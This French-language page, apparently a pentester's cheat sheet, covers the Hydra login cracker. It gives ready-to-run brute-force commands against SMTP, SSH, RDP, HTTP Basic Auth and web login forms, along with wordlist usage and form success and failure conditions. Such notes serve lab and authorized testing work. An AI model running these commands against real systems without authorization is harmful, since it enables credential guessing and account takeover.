---
title: "Hydra"
date: 2025-05-07T15:00:00+02:00
draft: false
tags: ["Outils", "Pentester"]
categories: ["Outils"]
summary: "Hydra"
showToc: true
tocOpen: true
---

Hydra est un craqueur d'identifiants réseau rapide qui prend en charge de nombreux protocoles d'attaque. C'est un outil polyvalent qui peut effectuer des attaques par force brute (brute-force) sur un large éventail de services, y compris les applications web, les services de connexion à distance comme SSH et FTP, et même les bases de données.

Utilisation de base
La syntaxe de base d'Hydra est la suivante :

```
hydra [login_options] [password_options] [attack_options] [service_options]
```




```
hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
```

Pages de connexion HTTP

```
hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```

SMTP 

```
hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
```

https://github.com/digininja/CeWL ( generer une liste de mot passe )


```
hydra -L user.list -P password.list rdp://10.129.42.197
```

serveur SSH 

```
hydra -l root -p toor -M targets.txt ssh
```


## Authentification HTTP de base

Les applications web emploient souvent des mécanismes d'authentification pour protéger les données et les fonctionnalités sensibles. 

### Exploiter la Basic Auth avec Hydra

```
hydra -l user-name -P wordlist_password 127.0.0.1 http-get / -s 81
```

## Formulaires de connexion

Au-delà du domaine de l'authentification HTTP de base (Basic HTTP Authentication), de nombreuses applications web utilisent des formulaires de connexion personnalisés comme principal mécanisme d'authentification.

La structure générale d'une commande Hydra utilisant http-post-form est la suivante :

```
hydra [options] target http-post-form "path:params:condition_string"
```

Dans le module http-post-form de Hydra, les conditions de réussite et d'échec sont cruciales pour identifier correctement les tentatives de connexion valides et invalides. Hydra se base principalement sur les conditions d'échec (F=...) pour déterminer quand une tentative de connexion a échoué, mais vous pouvez également spécifier une condition de réussite (S=...) pour indiquer quand une connexion est réussie.

La condition d'échec (F=...) est utilisée pour rechercher une chaîne de caractères spécifique dans la réponse du serveur qui signale une tentative de connexion échouée.


```
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"

hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"

hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"

```


Exemple 

```
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```